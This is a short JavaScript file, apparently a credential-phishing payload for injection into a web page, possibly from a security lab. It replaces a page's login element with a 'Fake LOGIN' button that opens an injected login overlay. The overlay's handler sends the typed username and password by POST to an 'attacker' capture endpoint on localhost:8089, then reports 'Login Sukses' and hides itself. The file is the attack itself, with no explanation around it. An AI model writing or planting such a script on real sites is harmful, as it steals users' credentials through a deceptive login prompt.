window.onload = function() {
	var relogin = document.querySelectorAll('rf-login')[0];
	relogin.innerHTML = "Fake LOGIN";
	relogin.setAttribute('onclick','appendLogin()');
}
function appendHtml(e, str) {
	let div = document.createElement('div');
	div.innerHTML = str;
	while (div.children.length > 0) {
		e.appendChild(div.children[0]);
	}
}
function appendCss(url) {
	let head = document.getElementsByTagName('head')[0];
    let link = document.createElement('link');
    link.rel = "stylesheet";
    link.type = "text/css";
    link.href = url;
    link.media = "all";
    head.appendChild(link);
}
function appendLogin() {
	var at_login = `
	<at-bg>
		<at-login>
			<at-title>Fake LOGIN
				<at-exit onclick="doExit()">X</at-exit>
			</at-title>
			<at-form>
				<input id="user" type="text" placeholder="Username/Email">
				<input id="pass" type="password" placeholder="Password">
				<button onclick="doLogin()">LOGIN</button>
			</at-form>
		</at-title>
	</at-bg>`;
	appendHtml(document.getElementsByTagName('body')[0], at_login);
	appendCss("http://localhost:8089/attacker/relogin/logincapture.css");
}
function doLogin() {
	let at_http = new XMLHttpRequest();
	let at_url = "http://localhost:8089/attacker/relogin/logincapture.php";
	let t_user = document.getElementById('user').value;
	let t_pass = document.getElementById('pass').value;
	let at_params = `sendlogin=&u=${t_user}&p=${t_pass}`;

	at_http.open("POST", at_url, true);
	at_http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	at_http.onreadystatechange = function() {
	    if(at_http.readyState == 4 && at_http.status == 200) {
	        alert("Login Sukses");
	        doExit();
	    }
	}
	at_http.send(at_params);
}
function doExit() {
	let at_login = document.querySelectorAll('at-bg')[0];
	at_login.parentNode.removeChild(at_login);
}
